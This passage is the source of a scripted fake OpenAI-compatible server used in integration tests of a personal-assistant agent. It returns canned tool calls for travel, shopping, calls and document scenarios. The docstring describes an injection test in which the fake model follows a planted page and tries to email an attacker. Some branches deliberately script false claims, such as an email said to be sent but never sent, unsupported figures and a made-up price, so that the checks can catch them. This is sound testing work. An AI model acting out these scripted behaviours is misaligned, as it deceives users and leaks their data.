"""Scripted OpenAI-compatible server for integration tests.

Behaviour is chosen from the latest user goal text:
 - planner calls (system prompt contains 'planning module') -> fixed JSON plan
 - 'SEND' goal  -> calls gmail_send, then final answer
 - 'BROWSE' goal -> browser_navigate to TEST_PAGE, click the Submit button, final
 - 'INJECT' goal -> browser_navigate to injection page, then try gmail_send to attacker
 - 'REMEMBER' goal -> memory_remember then final
 - 'SCHEDULE' goal -> schedule_create then final
 - otherwise -> plain answer
"""
import json
import os
import re
import uuid

from fastapi import FastAPI, Request

app = FastAPI()
PAGE = os.environ.get("TEST_PAGE", "http://example.com/")
CALLS = []
RETRY = {}   # scenario -> failures served so far


def tc(name, args):
    return {"id": "call_" + uuid.uuid4().hex[:8], "type": "function", "function": {"name": name, "arguments": json.dumps(args)}}


def reply(content="", calls=None):
    msg = {"role": "assistant", "content": content}
    if calls:
        msg["tool_calls"] = calls
    return {"choices": [{"message": msg, "finish_reason": "tool_calls" if calls else "stop"}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 5}}


@app.get("/v1/models")
def models():
    return {"data": [{"id": "fake"}]}


AUTH = []   # Authorization header of each chat call ("" = none), for models_e2e.py


CITYLIFT = {}   # city_guides_e2e.py: whether browser tools were offered after the guide was loaded
IMAGE_CALLS = []   # Images API requests (imagegen_e2e.py): the JSON body or the multipart form fields


def _png():
    import base64, io
    from PIL import Image
    buf = io.BytesIO()
    Image.new("RGB", (64, 64), (200, 30, 30)).save(buf, "PNG")
    return base64.b64encode(buf.getvalue()).decode()


@app.post("/v1/images/generations")
async def images_generations(req: Request):
    b = await req.json()
    IMAGE_CALLS.append({"url": "generations", "body": b})
    return {"data": [{"b64_json": _png(), "revised_prompt": b.get("prompt")}]}


@app.post("/v1/images/edits")
async def images_edits(req: Request):
    form = await req.form()
    IMAGE_CALLS.append({"url": "edits", "body": {k: v for k, v in form.items() if isinstance(v, str)},
                        "files": [k for k, v in form.multi_items() if not isinstance(v, str)]})
    return {"data": [{"b64_json": _png(), "revised_prompt": form.get("prompt")}]}


@app.get("/image_calls")
def image_calls():
    return IMAGE_CALLS


@app.get("/last_auth")
def last_auth():
    return {"authorization": AUTH[-1] if AUTH else None, "calls": len(AUTH)}


@app.post("/v1/chat/completions")
async def chat(req: Request):
    b = await req.json()
    CALLS.append(b)
    AUTH.append(req.headers.get("authorization") or "")
    if b.get("model") == "missing-model":
        from fastapi.responses import JSONResponse
        return JSONResponse({"error": {"message": "model 'missing-model' not found"}}, status_code=404)
    msgs = b["messages"]
    if b.get("model") == "text-only" and "image_url" in json.dumps(msgs):
        from fastapi.responses import JSONResponse
        return JSONResponse({"error": {"message": "image input is not supported by this model"}}, status_code=400)
    sys = msgs[0]["content"] if msgs and msgs[0]["role"] == "system" else ""
    # retry policy (retry_e2e.py): the first calls of a task fail, then it works
    goal_txt = next((str(m["content"]) for m in reversed(msgs) if m["role"] == "user"), "")
    m = re.search(r"RETRY(429|503)x(\d)", goal_txt)
    if m and not sys.startswith("You name conversations"):
        from fastapi.responses import JSONResponse
        key = m.group(0); n = RETRY.get(key, 0)
        if n < int(m.group(2)):
            RETRY[key] = n + 1
            hdr = {"Retry-After": "1"} if m.group(1) == "429" else {}
            return JSONResponse({"error": {"message": f"fake {m.group(1)} #{n + 1}"}}, status_code=int(m.group(1)), headers=hdr)
    if sys.startswith("You name conversations"):   # chat titles (agent._retitle)
        last = next((m["content"] for m in reversed(msgs) if m["role"] == "user"), "")
        if "很长很长" in str(last):   # resize_ui.py needs its long first-question title kept: "nothing usable" from the model
            return reply("")
        for ask, title in ((SHOW_TRIP, "Tokyo trip this week"), (SHOW_CITY, "Moving to Shanghai"), (SHOW_SGAC, "Singapore arrival card")):
            if ask in str(last):   # marketing_shots.py: real-looking titles in the pictures
                return reply(title)
        users = re.findall(r"User: (.*)", str(last))   # the latest request: deterministic, and the title follows the chat
        return reply("Topic: " + (users[-1].split()[0][:16] if users and users[-1].split() else "chat"))
    if sys.startswith("You look at a file"):   # file_look / attachment reading
        txt = json.dumps(msgs[-1]["content"], ensure_ascii=False)
        if "merchant" in txt and "JSON" in txt:   # travel_expense_e2e.py: a photographed restaurant receipt
            return reply(json.dumps({"merchant": "Sushi Hoshizora", "address": "Ginza, Tokyo", "date": "2026-11-20", "time": "19:40",
                                     "currency": "JPY", "total": 18000, "subtotal": 16364, "tax": 1636, "service_charge": 0, "tip": 0,
                                     "payment_method": "card", "card_last4": "1111", "items": [{"name": "Omakase", "qty": 1, "amount": 16364}],
                                     "receipt_no": "R-7781", "language": "ja", "notes": None}, ensure_ascii=False))
        if "e-ticket" in txt.lower():   # arrival_nomail_e2e.py: an uploaded e-ticket instead of a booking email
            return reply("E-TICKET: Singapore Airlines SQ 708, Singapore (SIN) 2026-11-02 08:05 → Bangkok (BKK) 09:30. "
                         "Return SQ 711 2026-11-06. Hotel on the itinerary: Riverside Test Hotel, 1 Charoen Krung Road, Bangkok.")
        if "passport" in txt.lower():   # sgac_e2e.py: the data page (the number is never returned to chat)
            return reply(json.dumps({"name": "LU LUCAS", "sex": "M", "date_of_birth": "1985-04-12", "nationality": "AUS", "expiry": "2031-05-01"}))
        if "menu" in txt.lower():   # dining_dietary_e2e.py
            return reply("MENU (Japanese → English): 担々麺 Tantanmen — sesame and PEANUT sauce ¥1,100 ⚠ contains peanuts; "
                         "塩ラーメン Shio ramen ¥900 (wheat, soy); 餃子 Gyoza ¥500 (wheat, soy, garlic)")
        what = "a video contact sheet with numbered frames" if "contact sheet" in txt else "a red square labelled HELLO"
        return reply(f"VISION-SEEN: {what}")
    if sys.startswith("You look at a screenshot"):   # the vision helper behind browser_look
        return reply(fake_vision(msgs[-1]["content"]))
    if sys.startswith(("You locate things", "This is a zoomed-in part", "A red circle with a crosshair")):   # browser_locate
        return reply(fake_locate(sys, msgs[-1]["content"]))
    if "planning module" in sys and "inbox this week" in msgs[-1]["content"]:
        return reply(json.dumps({"objective": "Triage this week's inbox and prepare replies", "steps": [
            {"id": "s1", "description": "Search the inbox for important emails from the last 7 days", "tool_hint": "gmail", "risk": "read"},
            {"id": "s2", "description": "Read the threads that are waiting for a reply", "tool_hint": "gmail", "risk": "read"},
            {"id": "s3", "description": "Check the Q4 plan in Notion for context", "tool_hint": "notion", "risk": "read"},
            {"id": "s4", "description": "Draft replies and summarize what needs your decision", "tool_hint": "gmail", "risk": "write"}]}))
    if "planning module" in sys and "Q4 plan summary" in msgs[-1]["content"]:
        return reply(json.dumps({"objective": "Share the Q4 plan with the team on Slack", "steps": [
            {"id": "s1", "description": "Read the Q4 plan page in Notion", "tool_hint": "notion", "risk": "read"},
            {"id": "s2", "description": "Post a short summary to #general (needs approval)", "tool_hint": "slack", "risk": "send"}]}))
    if "planning module" in sys and SHOW_TRIP in msgs[-1]["content"]:   # marketing_shots.py
        return reply(json.dumps({"objective": "Put this week's Tokyo trip into one timeline", "steps": [
            {"id": "s1", "description": "Find the flight, hotel and restaurant bookings in mail", "tool_hint": "gmail", "risk": "read", "parallel": "p1"},
            {"id": "s2", "description": "Read this week's calendar", "tool_hint": "calendar", "risk": "read", "parallel": "p1"},
            {"id": "s3", "description": "Build the day-by-day timeline and flag gaps and conflicts", "tool_hint": "trip-today", "risk": "read"}]}))
    if "planning module" in sys and SHOW_SGAC in msgs[-1]["content"]:
        return reply(json.dumps({"objective": "Fill in the SG Arrival Card for Sunday's flight", "steps": [
            {"id": "s1", "description": "Find the flight and the hotel in mail", "tool_hint": "gmail", "risk": "read", "parallel": "p1"},
            {"id": "s2", "description": "Read the traveller's details from the profile and the Vault", "tool_hint": "profile", "risk": "read", "parallel": "p1"},
            {"id": "s3", "description": "Fill the ICA form; the passport number from the Vault (approval)", "tool_hint": "browser", "risk": "write"},
            {"id": "s4", "description": "Hand the form over for review and Submit", "tool_hint": "browser", "risk": "read"}]}))
    if "planning module" in sys and SHOW_CITY in msgs[-1]["content"]:
        return reply(json.dumps({"objective": "Brief a family moving to Shanghai on neighbourhoods and rents", "steps": [
            {"id": "s1", "description": "Load the Shanghai city guide", "tool_hint": "shanghai", "risk": "read"},
            {"id": "s2", "description": "Get today's USD/CNY rate", "tool_hint": "market_data", "risk": "read"},
            {"id": "s3", "description": "Compare neighbourhoods, rents and schools", "tool_hint": "shanghai", "risk": "read"}]}))
    if "planning module" in sys and "PARALLEL" in msgs[-1]["content"]:   # parallel_steps_e2e.py: three independent steps
        return reply(json.dumps({"objective": "Compare three hotels", "steps": [
            {"id": "s1", "description": "Research Hotel A", "tool_hint": "delegate", "risk": "read", "parallel": "p1"},
            {"id": "s2", "description": "Research Hotel B", "tool_hint": "delegate", "risk": "read", "parallel": "p1"},
            {"id": "s3", "description": "Research Hotel C", "tool_hint": "delegate", "risk": "read", "parallel": "p1"},
            {"id": "s4", "description": "Compare and answer", "tool_hint": "files", "risk": "read"}]}))
    if "planning module" in sys and "LANGCHECK" in msgs[-1]["content"]:
        first = sys.split("\n", 1)[0][:40]
        return reply(json.dumps({"objective": "PLANRULE=" + first, "steps": []}))
    if "planning module" in sys:
        return reply('```json\n{"objective": "test objective", "steps": [{"id":"s1","description":"do the thing","tool_hint":"x","risk":"read"}, {"id":"s2","description":"report","tool_hint":"x","risk":"read"}]}\n```')
    if msgs and "Extract durable facts" in msgs[-1]["content"]:
        return reply('{"facts": [{"fact": "Lucas prefers direct flights.", "category": "preference", "entity": ""}]}')
    if msgs and str(msgs[-1]["content"]).startswith("Sort what the USER says"):
        items = [{"kind": "preference", "fact": "Lucas prefers direct flights.", "entity": ""}]
        if "PROFILEFACT" in msgs[-1]["content"]:
            items += [{"kind": "profile", "fact": "Lucas's mobile is +65 9000 1111", "field": "phone", "value": "+65 9000 1111"},
                      {"kind": "ephemeral", "fact": "Lucas has a dentist booking on Friday", "entity": ""}]
        return reply(json.dumps({"items": items}))
    if msgs and str(msgs[-1]["content"]).startswith("You are tidying"):
        ids = re.findall(r"^(fact_\w+) \| long \| .*Opened zipair", msgs[-1]["content"], re.M)
        return reply(json.dumps({"demote": [{"id": i, "reason": "process log"} for i in ids]}))
    users = [m["content"] for m in msgs if m["role"] == "user" and not str(m["content"]).startswith(("（系统）", "(System)"))]
    goal = users[-1] if users else ""
    tools_done = [m for m in msgs if m["role"] == "tool"]
    n = len(tools_done)
    last_tool = tools_done[-1]["content"] if tools_done else ""
    allu = "\n".join(str(m["content"]) for m in msgs if m["role"] == "user")
    tnames = [t["function"]["name"] for t in (b.get("tools") or [])]
    if "focused sub-agent of OMuse" in sys and "SUBTASK" in goal:   # parallel_steps_e2e.py: a sub-agent opens its page in its own lane
        url = re.search(r"https?://\S+", goal).group(0)
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": url})])
        m = re.search(r"Hotel[A-C]", last_tool)
        return reply(f"SUBREPORT {m.group(0) if m else '?'} from {url}")
    if "PARALLEL" in goal and "focused sub-agent" not in sys:   # parallel_steps_e2e.py: the parallel stage → every step in ONE turn
        hosts = ["shop.test", "opentable.test", "shop.test"]   # the two public test hosts (loopback addresses are refused)
        jobs = [{"role": "researcher", "step": f"s{i + 1}",
                 "task": f"SUBTASK open http://{h}:8094/slow?s=2&name=Hotel{'ABC'[i]} and report the page title"} for i, h in enumerate(hosts)]
        if n == 0:
            if "PARALLELBATCH" in goal:
                return reply("", [tc("delegate", {"tasks": jobs})])
            return reply("", [tc("delegate", j) for j in jobs])
        # a summary, not the raw <subagent_report> tags (angle-bracket markup is stripped from answers)
        found = re.findall(r"SUBREPORT (Hotel\w+)", "\n".join(str(m["content"]) for m in tools_done))
        return reply("PARALLEL RESULT: " + ", ".join(found))
    sk = travel_skill(goal, sys, msgs, tools_done, n, last_tool, tnames)
    if sk is not None:
        return sk
    if "FAKECLAIM" in goal:   # says it sent an email without sending anything (outcome check, roadmap batch 1)
        if "（系统）你的回答说已经" in allu or "(System) Your answer says you" in allu:
            return reply("我还没有发送邮件：这个任务里没有执行发送，下面是准备好的草稿内容。")
        return reply("好的，邮件已发送给 Jennifer。")
    if "Kiprun 跑步袜 Run 100" in goal:   # golden G12: a price watch (a local tool the dry run stops)
        if n == 0:
            return reply("", [tc("watch_create", {"url": "https://www.decathlon.sg/p/kiprun-run-100", "mode": "price_below",
                                                   "threshold": 3, "keyword": "Kiprun", "current_price": 3.9})])
        return reply("准备好了降价提醒：价格低于 S$3 时通知你（演练模式，未实际创建）。")
    if "按月复利" in goal:   # golden G19
        if n == 0:
            return reply("", [tc("calculate", {"expression": "1500*((1+0.03/12)**60-1)/(0.03/12)"})])
        num = re.findall(r"\d[\d,]*\.?\d*", last_tool)
        return reply(f"5 年后大约有 S${num[-1] if num else '?'}。")
    if "新加坡 10 月的天气" in goal:   # golden G20: asks for a takeover, which a dry run stops (no pop-up for the user)
        if n == 0:
            return reply("", [tc("browser_request_takeover", {"reason": "请帮我通过验证"})])
        return reply("10 月是西南季风转东北季风的过渡期，午后多雷阵雨。来源：https://www.weather.gov.sg/climate-climate-of-singapore/ ，"
                     "https://en.wikipedia.org/wiki/Climate_of_Singapore")
    if "ZHANSWER" in goal:   # a model that answers in Chinese although the setting is English
        last = next((str(m["content"]) for m in reversed(msgs)
                     if not str(m["content"]).startswith(("(System) Status", "（系统）当前状态"))), "")
        if last.startswith("(System) Settings → Language is English"):
            return reply("Here is the most important email: the security alert from Google Workspace about a suspicious login.")
        return reply("最重要的邮件是 Google Workspace 发来的可疑登录安全告警，建议尽快检查。")
    if "SKILLCHECK" in goal:   # report which skills the agent's instructions list
        sysm = msgs[0]["content"] if msgs and msgs[0]["role"] == "system" else ""
        sec = sysm.split("## Skills", 1)[1].split("\n## ", 1)[0] if "## Skills" in sysm else sysm
        return reply("SKILLS=" + ",".join(re.findall(r"^- ([\w.-]+):", sec, re.M)))
    if "LOADSKILL" in goal:
        if n == 0:
            return reply("", [tc("load_skill", {"name": goal.split("LOADSKILL")[1].split()[0]})])
        return reply("LOADED=" + last_tool[:120])
    if "LANGCHECK" in goal:   # report what language the agent's instructions are in
        import re as _re
        cjk = _re.compile(r"[\u3400-\u9fff]")
        sysm = msgs[0]["content"] if msgs and msgs[0]["role"] == "system" else ""
        tools_txt = json.dumps(b.get("tools") or [], ensure_ascii=False)
        rule = sysm.split("\n", 1)[0][:40]
        return reply(f"RULE={rule} | SYS_CJK={len(cjk.findall(sysm))} | TOOLS_CJK={len(cjk.findall(tools_txt))} | NTOOLS={len(tnames)}")
    if "BUDGETPDF" in goal:   # a research task that keeps reading pages until the step budget says: deliver now
        done = [m for m in msgs if m["role"] == "tool"]
        if "step budget" not in allu and "browser_navigate" in tnames:
            return reply("", [tc("browser_navigate", {"url": f"http://shop.test:8099/restaurants.html?p={n}"})])
        if not any("PDF 已在本机生成" in str(m["content"]) for m in done):
            return reply("", [tc("make_pdf", {"markdown": "# 调研简报\n\n- Kuriya Dining 19:00\n- Shinzo 19:30", "output": "reports/brief.pdf"})])
        if not any("已发送到对话" in str(m["content"]) for m in done):
            return reply("", [tc("send_file", {"path": "reports/brief.pdf", "note": "简报"})])
        return reply(f"BUDGET DONE after {n} tool results; tools offered at the end: {','.join(sorted(tnames))}")
    if "SHOPCART" in goal:   # the 2026-09-29 Amazon run: find a case on a long page, add it to the cart
        # a real model would reason from the tool results; this one follows the path the skill describes
        def ref_after(pattern, text):
            m = re.search(r"\[(e\d+)\][^\n]*" + pattern, text, re.I)
            return m.group(1) if m else None
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/shop.html?k=iphone+17+pro+max+case"})])
        if n == 1:   # the snapshot is cut off inside the header: look at the page instead of re-opening it
            return reply("", [tc("browser_look", {"question": "Which iPhone 17 Pro Max case in the results looks nicest? Name its link ref."})])
        if n == 2:   # also cross-check by text search
            return reply("", [tc("browser_find", {"query": "Aurora Glitter Case"})])
        if n == 3:
            seen = str(tools_done[1]["content"])
            ref = (re.search(r"click \[(e\d+)\]", seen) or [None, None])[1] or ref_after("Aurora Glitter", last_tool)
            return reply("", [tc("browser_click", {"ref": ref or "e1"})])
        if n == 4:
            return reply("", [tc("browser_find", {"query": "Add to Cart"})])
        if n == 5:
            return reply("", [tc("browser_click", {"ref": ref_after("Add to Cart", last_tool) or "e1"})])
        if n == 6:
            return reply("", [tc("browser_look", {"question": "Did the item get added to the cart? What does the cart show?"})])
        return reply("SHOP DONE: " + last_tool[:600])
    if "CHOICES" in goal:   # present_choices: a made-up price is refused, exact excerpts are shown as verified cards
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/shop.html?k=case"})])
        if n == 1:
            return reply("", [tc("browser_find", {"query": "Aurora Glitter Case"})])
        if n == 2:
            return reply("", [tc("browser_find", {"query": "Kickstand Case"})])
        if n == 3:   # hallucinated detail + a page never read
            return reply("", [tc("present_choices", {"question": "Which case?", "kind": "comparison", "options": [
                {"label": "Aurora Glitter Case for iPhone 17 Pro Max, MagSafe compatible", "details": ["S$9.90", "4.4 out of 5 stars"],
                 "source_url": "http://shop.test:8099/shop.html?k=case"},
                {"label": "Titanium Case", "details": ["S$5"], "source_url": "http://other.test/titanium"}]})])
        if n == 4:
            return reply("", [tc("present_choices", {"question": "Which case do you like?", "kind": "comparison", "options": [
                {"label": "Aurora Glitter Case for iPhone 17 Pro Max, MagSafe compatible", "details": ["S$21.90", "4.4 out of 5 stars · 231 ratings"],
                 "source_url": "http://shop.test:8099/shop.html", "note": "闪亮的紫色，最好看"},
                {"label": "Kickstand Case for iPhone 17 Pro Max", "details": ["S$33.90"],
                 "source_url": "http://shop.test:8099/shop.html", "note": "带支架"}]})])
        return reply("CHOICES DONE: " + last_tool[:400])
    if "DIALCALL" in goal:   # a +1 number goes out through DialMCP; poll until the call is over
        if n == 0:
            return reply("", [tc("phone_call", {"to": "+1 415 555 0123", "callee_name": "Zuni Cafe",
                                                "purpose": "Book a table for 2 tonight at 19:30; acceptable window 19:00-20:30.",
                                                "may_share": "Name: Lucas Lu"})])
        ids = re.findall(r"(call_[0-9a-f]{12})", " ".join(str(m["content"]) for m in tools_done))
        if n > 15 or not ids:
            return reply("DIAL GAVE UP: " + last_tool[:600])
        if any(f'"status": "{x}"' in last_tool for x in ("ended", "no_answer", "failed")):
            return reply("DIAL DONE: " + last_tool[:2500])
        return reply("", [tc("phone_call_status", {"call_id": ids[0], "wait_seconds": 30})])
    if "PHONECALL" in goal:
        if n == 0:
            return reply("", [tc("phone_call", {"to": "+65 6123 4567", "language": "English",
                                                "purpose": "Book a table for 2 at Aurora Restaurant tomorrow at 7 pm; get a reference number.",
                                                "may_share": "Name: Lucas Lu; phone +65 8000 0000"})])
        ids = re.findall(r"(call_[0-9a-f]{12})", " ".join(str(m["content"]) for m in tools_done))
        if n > 12 or not ids:
            return reply("PHONE GAVE UP: " + last_tool[:400])
        if '"status": "ended"' in last_tool or '"status": "no_answer"' in last_tool:
            return reply("CALL DONE: " + last_tool[:1500])
        return reply("", [tc("phone_call_status", {"call_id": ids[0], "wait_seconds": 30})])
    if "WATCHPRICE" in goal:
        if n == 0:   # a keyword that isn't on the page: the watch must refuse to be created, and say what it saw
            return reply("", [tc("watch_create", {"name": "Aurora case price", "url": "http://shop.test:8099/watch.html",
                                                  "mode": "price_below", "threshold": 20, "keyword": "Zebra"})])
        if n == 1:   # the model thinks the price is 30: the watch reads 25 itself and refuses to watch "the wrong price"
            return reply("", [tc("watch_create", {"name": "Aurora case price", "url": "http://shop.test:8099/watch.html",
                                                  "mode": "price_below", "threshold": 20, "keyword": "Aurora",
                                                  "current_price": 30})])
        if n == 2:
            return reply("", [tc("watch_create", {"name": "Aurora case price", "url": "http://shop.test:8099/watch.html",
                                                  "mode": "price_below", "threshold": 20, "keyword": "Aurora",
                                                  "current_price": 25})])
        return reply("WATCH DONE: " + last_tool[:300])
    if "PDFFORM" in goal:
        if n == 0:
            return reply("", [tc("pdf_form_fields", {"path": "forms/permission_slip.pdf"})])
        if n == 1:
            return reply("", [tc("pdf_form_fill", {"path": "forms/permission_slip.pdf", "values": {
                "student_name": "Able Lu", "class": "5JNI", "parent_name": "Lucas Lu", "consent": True,
                "lunch": "vegetarian", "tshirt": "L", "signature": "Lucas"}})])
        if n == 2:
            return reply("", [tc("send_file", {"path": "forms/permission_slip-filled.pdf", "note": "请检查"})])
        return reply("PDF DONE: " + "\n".join(str(m["content"])[:600] for m in tools_done))
    if "SUPPORTCHAT" in goal:   # a Tidio-style chat bot whose widget lives in an open shadow root
        def ref_of(pattern, text):
            m = re.search(r"\[((?:f\d+)?e\d+)\][^\n]*" + pattern, text, re.I)
            return m.group(1) if m else None
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/support.html"})])
        if n == 1:
            return reply("", [tc("browser_look", {"question": "Is there a chat launcher? Name its label."})])
        if n == 2:
            ref = (re.search(r"click \[((?:f\d+)?e\d+)\]", last_tool) or [None, None])[1]
            return reply("", [tc("browser_click", {"ref": ref or "e1"})])
        if n == 3:
            return reply("", [tc("browser_find", {"query": "Type your message"})])
        if n == 4:
            return reply("", [tc("browser_type", {"ref": ref_of("Type your message", last_tool) or "e1", "submit": True,
                                                 "text": "Hi! Do you have a free plan, and how many AI conversations does it include?"})])
        if n == 5:
            return reply("", [tc("browser_wait", {"seconds": 3})])
        if n == 6:
            return reply("", [tc("browser_snapshot", {})])
        m = re.search(r"Lyra: ([^\n\"\\]+)", last_tool)
        return reply("SUPPORT DONE: " + (m.group(1) if m else "NO REPLY " + last_tool[:800]))
    if "BUBBLECHAT" in goal:   # the Tidio case: bubble + chat window inside a cross-origin iframe, no names, no refs
        def xy(text):
            m = re.search(r"browser_click_at \{\\?\"x\\?\": (\d+), \\?\"y\\?\": (\d+)\}", text)
            return (int(m.group(1)), int(m.group(2))) if m else (0, 0)
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/bubble.html"})])
        if n == 1:
            return reply("", [tc("browser_locate", {"target": "the blue round chat bubble in the bottom-right corner"})])
        if n == 2:
            x, y = xy(last_tool)
            return reply("", [tc("browser_click_at", {"x": x, "y": y})])
        if n == 3:
            return reply("", [tc("browser_locate", {"target": "the yellow message box of the chat window"})])
        if n == 4:
            x, y = xy(last_tool)
            return reply("", [tc("browser_click_at", {"x": x, "y": y, "text": "Hi! Do you have a free plan?", "submit": True})])
        if n == 5:
            return reply("", [tc("browser_wait", {"seconds": 3})])
        if n == 6:
            return reply("", [tc("browser_snapshot", {})])
        m = re.search(r"Bot: Yes[^\n\"\\]+", last_tool)
        return reply("BUBBLE DONE: " + (m.group(0) if m else "NO REPLY " + last_tool[:1500]))
    if "SUPPORTIFRAME" in goal:   # a Zendesk-style messaging window inside an iframe
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/support_iframe.html"})])
        if n == 1:
            return reply("", [tc("browser_look", {"question": "Where do I type a message? Name its label."})])
        if n == 2:
            ref = (re.search(r"click \[((?:f\d+)?e\d+)\]", last_tool) or [None, None])[1]
            return reply("", [tc("browser_type", {"ref": ref or "e1", "submit": True, "text": "How long does delivery take?"})])
        if n == 3:
            return reply("", [tc("browser_wait", {"seconds": 3})])
        if n == 4:
            return reply("", [tc("browser_snapshot", {})])
        m = re.search(r"Zed: Standard[^\n\"\\]+", last_tool)
        return reply("IFRAME DONE: " + (m.group(0) if m else "NO REPLY " + last_tool[:800]))
    if "SHOPSCROLL" in goal:
        if n == 0:
            return reply("", [tc("browser_navigate", {"url": "http://shop.test:8099/shop.html"})])
        if n == 1:
            return reply("", [tc("browser_scroll", {"direction": "down"})])
        return reply("SCROLL DONE: " + last_tool[:3000])
    if "BLOCKSITE" in goal:
        seq = [("browser_navigate", {"url": "http://opentable.test:8094/wall"}),
               ("browser_navigate", {"url": "http://opentable.test:8094/wall?page=2"}),
               ("browser_navigate", {"url": "http://shop.test:8099/restaurants.html"})]
        if n < len(seq):
            return reply("", [tc(*seq[n])])
        return reply("BLOCK RESULTS:\n" + "\n=====\n".join(str(m["content"])[:300] for m in tools_done))
    if "XLSXOUT" in goal:
        if n == 0:
            return reply("", [tc("make_xlsx", {"output": "reports/flights", "sheets": [
                {"name": "直飞航班", "columns": ["航空公司", "起飞", "价格 SGD"],
                 "rows": [["Scoot", "23:30", "600"], ["ZIPAIR", "00:40", "805"], ["ANA", "06:35", "1,085"]]}]})])
        if n == 1:
            return reply("", [tc("send_file", {"path": "reports/flights.xlsx", "note": "航班对比"})])
        return reply("XLSX " + last_tool[:200])
    if "CALBOOK" in goal:
        if n == 0:
            return reply("", [tc("calendar_free_slots", {"time_min": "2026-10-03 17:00", "time_max": "2026-10-03 22:00",
                                                          "duration_minutes": 90, "day_start": "17:00", "day_end": "22:00"})])
        if n == 1:
            return reply("", [tc("calendar_create_event", {"title": "🍽 Kuriya Dining", "start": "2026-10-03 19:00", "end": "2026-10-03 21:00",
                                                            "location": "Orchard", "description": "Ref ABC123, 2 people",
                                                            "attendees": ["eva@example.com"], "reminder_minutes": 120})])
        return reply("CAL " + "\n".join(str(m["content"])[:400] for m in tools_done))
    if "MAKEPDF" in goal:   # write a Chinese report, print it to PDF locally, hand it over
        if n == 0:
            return reply("", [tc("files_write", {"path": "reports/cn.md", "content":
                "# AI 未来学院分析报告\n\n**结论**：本地生成，无需上传。\n\n| 公司 | 产品 |\n|---|---|\n| 腾讯 | WorkBuddy |\n\n"
                "- 要点一\n  - 子项\n\n![图表](chart.png)\n\n![追踪](http://shop.test:8099/track-md.png)\n"})])
        if n == 1:
            return reply("", [tc("make_pdf", {"source": "reports/cn.md"})])
        if n == 2:
            return reply("", [tc("send_file", {"path": "reports/cn.pdf", "note": "PDF 版报告"})])
        return reply("PDF 已发送 " + last_tool[:200])
    if "SENDFILE" in goal:   # make a report, then hand it to the user as a download
        if n == 0:
            return reply("", [tc("files_write", {"path": "reports/brief.md", "content": "# Brief\n\nHello from OMuse.\n"})])
        if n == 1:
            return reply("", [tc("send_file", {"path": "reports/brief.md", "note": "今天的简报 today's brief"})])
        return reply("文件已发送 File sent: " + last_tool[:200])
    if "MARKETTEST" in goal:   # market_data for numbers, make_chart(symbols=...) for a comparison chart
        if n == 0:
            return reply("", [tc("market_data", {"symbols": ["0700.HK", "hsbc holdings", "NOPE.XX"], "range": "1y"})])
        if n == 1:
            return reply("", [tc("make_chart", {"type": "line", "title": "汇丰 vs 渣打", "symbols": ["0005.HK", "2888.HK"], "range": "2y"})])
        return reply("MARKET RESULTS:\n" + "\n=====\n".join(str(m["content"])[:8000] for m in tools_done))
    if "WEBREAD" in goal:   # browser_search then browser_read several pages in one call
        if n == 0:
            return reply("", [tc("browser_search", {"query": "olares one"})])
        if n == 1:
            return reply("", [tc("browser_read", {"urls": ["http://shop.test:8094/slow?s=1&name=PageA",
                                                           "http://shop.test:8094/slow?s=1&name=PageB",
                                                           "http://shop.test:8094/slow?s=1&name=PageC"]})])
        return reply("WEB RESULTS:\n" + "\n=====\n".join(str(m["content"])[:2000] for m in tools_done))
    if "DOCXTEST" in goal:   # make_docx: a Word file made locally (no online converters), then sent to the chat
        if n == 0:
            return reply("", [tc("make_chart", {"type": "bar", "title": "收入", "labels": ["4月", "5月"], "values": [1, 2], "send": False})])
        if n == 1:
            return reply("", [tc("make_docx", {"markdown": "# 合同摘要\n\n- 服务费 **12 万**\n\n| 条款 | 建议 |\n|---|---|\n| 知识产权 | 改为甲方 |\n\n![收入](charts/收入.png)",
                                               "output": "reports/summary"})])
        if n in (2, 3):   # the second send of the same file is skipped (it is already in the chat)
            return reply("", [tc("send_file", {"path": "reports/summary.docx"})])
        return reply("DOCX RESULTS:\n" + "\n=====\n".join(str(m["content"])[:300] for m in tools_done))
    if "CTXTEST" in goal:   # 2026-10-04 M2-02: three big results in one turn overflowed the model's context window
        body_chars = sum(len(str(m.get("content") or "")) for m in msgs[1:])
        if body_chars > 15000:
            from fastapi.responses import JSONResponse
            return JSONResponse({"error": {"code": 500, "message": "Context size has been exceeded.", "type": "server_error"}},
                                status_code=500)
        if n == 0:
            return reply("", [tc("files_write", {"path": f"data/big{i}.txt", "content": f"line {i} " * 1300}) for i in range(3)])
        if n == 3:
            return reply("", [tc("files_read", {"path": f"data/big{i}.txt"}) for i in range(3)])
        return reply(f"CTX OK after {n} results, body {body_chars} chars")
    if "NUMCHECK" in goal:   # 2026-10-03 M1-06: an answer with figures no tool produced is sent back once
        if n == 0:
            return reply("", [tc("calculate", {"expressions": ["6.5*365 - 6.5*3*52", "invest(1358.5, 4, 10, 0, 1)"]})])
        if "do not appear in any tool result" in allu or "没有出现在任何工具结果" in allu:
            return reply("FIXED: saves 1,358.50 a year; after 10 years 16,310.30")
        return reply("Saves 1,358.50 a year; after 10 years about 17,016.64")
    if "WEBLOOP" in goal:   # 2026-10-02 R4-04b: endless searching for a cleaner product list → web-budget nudge
        if "web budget" in allu:
            return reply(f"WRAPPED after {n} calls")
        return reply("", [tc("browser_search", {"query": f"anker power bank variant {n}"})])
    if "DATAQTEST" in goal:   # data_query: exact counts from a table (the 2026-10-02 NPS miscount), a log via pattern
        csv_text = "id,age,nps\n" + "\n".join(f"u{i},{20 + i},{[2, 5, 7, 8, 9, 10][i % 6]}" for i in range(40))
        log_text = "\n".join(f'2026-10-01T{h:02d}:00:00 1.1.1.1 "GET /api/{p}" {st} {ms}ms'
                             for h, p, st, ms in [(8, "a", 200, 100), (8, "b", 500, 300), (9, "b", 503, 500), (9, "a", 200, 120)])
        if n == 0:
            return reply("", [tc("files_write", {"path": "data/s.csv", "content": csv_text}),
                              tc("files_write", {"path": "data/app.log", "content": log_text})])
        if n == 2:
            return reply("", [tc("data_query", {"path": "data/s.csv"})])
        if n == 3:
            return reply("", [tc("data_query", {"path": "data/s.csv", "queries": json.dumps([
